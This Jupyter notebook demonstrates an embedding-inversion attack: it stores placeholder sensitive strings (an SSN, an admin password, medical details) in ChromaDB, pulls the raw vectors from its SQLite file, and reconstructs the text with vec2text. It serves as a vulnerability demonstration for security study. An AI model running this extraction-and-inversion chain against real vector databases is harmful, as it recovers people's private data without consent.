{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "01b404d7",
   "metadata": {},
   "source": [
    "# ChromaDB + Vec2Text Vulnerability Demonstration\n",
    "\n",
    "This notebook shows how sensitive data stored in ChromaDB can be reconstructed using vec2text\n",
    " \n",
    "### Attack Chain:\n",
    "1. Sensitive texts → OpenAI embeddings → ChromaDB storage\n",
    "2. Extract embeddings from SQLite database\n",
    "3. Use vec2text to reconstruct original sensitive text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fd80c5ca",
   "metadata": {},
   "outputs": [],
   "source": [
    "# 1. Set up OpenAI embedding & vec2text corrector models\n",
    "\n",
    "import vec2text\n",
    "from openai import OpenAI\n",
    "\n",
    "# ANSI color codes for live demo\n",
    "class Colors:\n",
    "    RED = '\\033[91m'\n",
    "    GREEN = '\\033[92m'\n",
    "    YELLOW = '\\033[93m'\n",
    "    BOLD = '\\033[1m'\n",
    "    UNDERLINE = '\\033[4m'\n",
    "    END = '\\033[0m'\n",
    "\n",
    "def print_colored(text, color=\"\", bold=False):\n",
    "    \"\"\"Print colored text for demo\"\"\"\n",
    "    prefix = Colors.BOLD if bold else \"\"\n",
    "    prefix += getattr(Colors, color.upper(), \"\")\n",
    "    print(f\"{prefix}{text}{Colors.END}\")\n",
    "\n",
    "# OpenAI setup\n",
    "embedding_model = \"text-embedding-ada-002\"\n",
    "client = OpenAI()\n",
    "\n",
    "# Load vec2text corrector for inversion\n",
    "print(f\"Loading vec2text corrector for OpenAI {embedding_model}...\")\n",
    "corrector = vec2text.load_pretrained_corrector(\"text-embedding-ada-002\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ace7bdb",
   "metadata": {},
   "outputs": [],
   "source": [
    "# 2. Set up ChromaDB\n",
    "\n",
    "import chromadb\n",
    "\n",
    "# ChromaDB setup\n",
    "persist_directory = \"./chromadb_vuln_demo\"\n",
    "chroma_client = chromadb.PersistentClient(path=persist_directory)\n",
    "\n",
    "# Create or reset collection\n",
    "try:\n",
    "    chroma_client.delete_collection(\"sensitive_docs\")\n",
    "except:\n",
    "    pass\n",
    "collection = chroma_client.create_collection(\"sensitive_docs\")\n",
    "\n",
    "print(f\"ChromaDB storage location: {persist_directory}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b783f129",
   "metadata": {},
   "outputs": [],
   "source": [
    "# 3. Define sensitive documents for demo\n",
    "\n",
    "sensitive_documents = [\n",
    "    # Financial/Identity Information\n",
    "    \"My social security number is 818-88-8118\",\n",
    "    \"Password for admin account is SecurePass123!\",\n",
    "    \n",
    "    # Medical Information\n",
    "    \"Patient diagnosed with Type 2 diabetes, prescribed metformin\",\n",
    "    \"Blood test results show cholesterol level of 277 mg/dL\",\n",
    "    \n",
    "    # Personal Information\n",
    "    \"John Doe lives at 1 World Trade Center, New York, NY 10007\",\n",
    "]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8af5900f",
   "metadata": {},
   "outputs": [],
   "source": [
    "# 4. Generate embeddings & store in ChromaDB\n",
    "\n",
    "print(\"=\"*80)\n",
    "print_colored(\"GENERATING EMBEDDINGS FROM SENSITIVE DOCUMENTS\", bold=True)\n",
    "print(\"=\"*80 + \"\\n\")\n",
    "\n",
    "def get_embeddings_openai(text_list):\n",
    "    \"\"\"Get embeddings from OpenAI API\"\"\"\n",
    "    response = client.embeddings.create(\n",
    "        input=text_list,\n",
    "        model=embedding_model,\n",
    "        encoding_format=\"float\",\n",
    "    )\n",
    "    return [e.embedding for e in response.data]\n",
    "\n",
    "# Get embeddings\n",
    "embeddings = get_embeddings_openai(sensitive_documents)\n",
    "print(f\"Generated {len(embeddings)} embeddings of dimension {len(embeddings[0])}\")\n",
    "\n",
    "# Store in ChromaDB\n",
    "collection.add(\n",
    "    documents=sensitive_documents,\n",
    "    embeddings=embeddings,\n",
    "    ids=[f\"sensitive_doc_{i}\" for i in range(len(sensitive_documents))],\n",
    "    metadatas=[{\"type\": \"sensitive\", \"doc_num\": i} for i in range(len(sensitive_documents))]\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f907f2cd",
   "metadata": {},
   "outputs": [],
   "source": [
    "# 5. Extract embeddings from ChromaDB SQLite backend\n",
    "\n",
    "import sqlite3\n",
    "import struct\n",
    "import os\n",
    "\n",
    "print(\"=\"*80)\n",
    "print_colored(\"EXTRACTING EMBEDDINGS FROM CHROMADB SQLITE BACKEND\", bold=True)\n",
    "print(\"=\"*80 + \"\\n\")\n",
    "\n",
    "# Connect to ChromaDB's SQLite database\n",
    "db_path = os.path.join(persist_directory, \"chroma.sqlite3\")\n",
    "conn = sqlite3.connect(db_path)\n",
    "cursor = conn.cursor()\n",
    "\n",
    "print(f\"Connected to SQLite database: {db_path}\")\n",
    "\n",
    "# Get embedding data from database\n",
    "cursor.execute(\"SELECT * FROM embeddings_queue ORDER BY seq_id\")\n",
    "rows = cursor.fetchall()\n",
    "\n",
    "print(f\"Found {len(rows)} embedding records in database\\n\")\n",
    "\n",
    "# Extract embeddings\n",
    "extracted_embeddings = []\n",
    "for i, row in enumerate(rows):\n",
    "    # Parse embedding (float32 binary data)\n",
    "    doc_id = row[4]  # Document ID\n",
    "    embedding_blob = row[5]  # Binary embedding data\n",
    "    num_floats = len(embedding_blob) // 4\n",
    "    embedding_values = struct.unpack(f'{num_floats}f', embedding_blob)\n",
    "    extracted_embeddings.append(list(embedding_values))\n",
    "    \n",
    "    print_colored(f\"Extracted embedding {i+1} corresponding to {doc_id}; {len(embedding_values)} dimensions\", \"RED\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "35933773",
   "metadata": {},
   "outputs": [],
   "source": [
    "# 6. Convert to PyTorch & invert each embedding\n",
    "\n",
    "import time\n",
    "import torch\n",
    "\n",
    "# Convert to PyTorch tensor on accelerated hardware if possible\n",
    "embeddings_tensor = torch.tensor(extracted_embeddings, dtype=torch.float32)\n",
    "if torch.backends.mps.is_available():\n",
    "    embeddings_tensor = embeddings_tensor.to('mps')\n",
    "elif torch.cuda.is_available():\n",
    "    embeddings_tensor = embeddings_tensor.cuda()\n",
    "\n",
    "results = []\n",
    "\n",
    "print(\"=\"*80)\n",
    "print_colored(\"RUNNING EMBEDDING INVERSION\", bold=True)\n",
    "print(\"=\"*80)\n",
    "\n",
    "# for i, (original_doc, embedding) in enumerate(zip(extracted_documents, embeddings_tensor)):\n",
    "for i, (original_doc, embedding) in enumerate(zip(sensitive_documents, embeddings_tensor)):\n",
    "    print_colored(f\"\\nDocument #{i+1}:\", bold=True)\n",
    "    print(f\"\\nOriginal:      \\\"{original_doc}\\\"\")\n",
    "    \n",
    "    start_time = time.time()\n",
    "    \n",
    "    # Invert embedding\n",
    "    reconstructed_list = vec2text.invert_embeddings(\n",
    "        embeddings=embedding.unsqueeze(0),  # Add batch dimension\n",
    "        corrector=corrector,\n",
    "        num_steps=4,\n",
    "        sequence_beam_width=1,\n",
    "    )\n",
    "    reconstructed = reconstructed_list[0]\n",
    "    \n",
    "    inversion_time = time.time() - start_time\n",
    "\n",
    "    print(f\"Reconstructed: \\\"{reconstructed}\\\"\")\n",
    "        \n",
    "    # Calculate similarity\n",
    "    if len(reconstructed) > 0:\n",
    "        orig_emb_cpu = embedding.cpu()\n",
    "        new_emb = get_embeddings_openai([reconstructed])[0]\n",
    "        new_emb_tensor = torch.tensor(new_emb)\n",
    "        similarity = torch.nn.functional.cosine_similarity(orig_emb_cpu, new_emb_tensor, dim=0).item()\n",
    "    else:\n",
    "        similarity = 0\n",
    "    \n",
    "    # Check exact match\n",
    "    exact_match = original_doc.lower().strip() == reconstructed.lower().strip()\n",
    "\n",
    "    if exact_match:\n",
    "        print_colored(f\"Exact match\", \"RED\", bold=True)\n",
    "    \n",
    "    sim_color = \"RED\" if similarity > 0.99 else \"YELLOW\" if similarity > 0.95 else \"GREEN\"\n",
    "    print_colored(f\"Similarity: {similarity:.4f}\", sim_color, bold=True)\n",
    "    print(f\"Inversion time: {inversion_time:.2f}s\")\n",
    "\n",
    "    results.append({\n",
    "        'original': original_doc,\n",
    "        'reconstructed': reconstructed,\n",
    "        'similarity': similarity,\n",
    "        'time': inversion_time,\n",
    "        'exact_match': exact_match,\n",
    "    })"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5944b639",
   "metadata": {},
   "outputs": [],
   "source": [
    "# 7. Summary Analysis\n",
    "\n",
    "import numpy as np\n",
    "\n",
    "print(\"\\n\" + \"=\"*80)\n",
    "print_colored(\"VULNERABILITY SUMMARY\", bold=True)\n",
    "print(\"=\"*80 + \"\\n\")\n",
    "\n",
    "total_docs = len(results)\n",
    "exact_matches = sum(1 for r in results if r['exact_match'])\n",
    "high_similarity = sum(1 for r in results if r['similarity'] > 0.95)\n",
    "\n",
    "print(f\"Total documents processed: {total_docs}\")\n",
    "print(f\"Exact reconstructions: {exact_matches} ({exact_matches/total_docs*100:.1f}%)\")\n",
    "print(f\"High similarity (>95%): {high_similarity} ({high_similarity/total_docs*100:.1f}%)\")\n",
    "\n",
    "avg_similarity = np.mean([r['similarity'] for r in results])\n",
    "avg_time = np.mean([r['time'] for r in results])\n",
    "sim_color = \"RED\" if avg_similarity > 0.99 else \"YELLOW\" if avg_similarity > 0.95 else \"GREEN\"\n",
    "\n",
    "print_colored(f\"Average similarity: {avg_similarity*100:.2f}%\", sim_color, bold=True)\n",
    "print(f\"Average inversion time: {avg_time:.2f}s\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "inversion-demo",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
